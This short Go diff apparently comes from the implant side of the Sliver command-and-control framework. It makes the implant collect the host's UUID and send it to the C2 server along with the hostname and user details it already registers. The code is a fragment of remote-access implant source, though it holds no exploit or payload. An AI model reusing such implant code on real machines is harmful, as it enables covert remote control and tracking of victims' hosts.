@@ -343,9 +343,16 @@ func (t *Transport) registerSliver() *sliverpb.Envelope {
 		remoteAddr = t.Conn.LocalAddr().String()
 	}
 
+	// Retrieve UUID
+	uuid := hostuuid.GetUUID()
+	// {{if .Config.Debug}}
+	log.Printf("Uuid: %s", uuid)
+	// {{end}}
+
 	data, err := proto.Marshal(&sliverpb.Register{
 		Name:              consts.SliverName,
 		Hostname:          hostname,
+		Uuid:              uuid,
 		Username:          currentUser.Username,
 		Uid:               currentUser.Uid,
 		Gid:               currentUser.Gid,
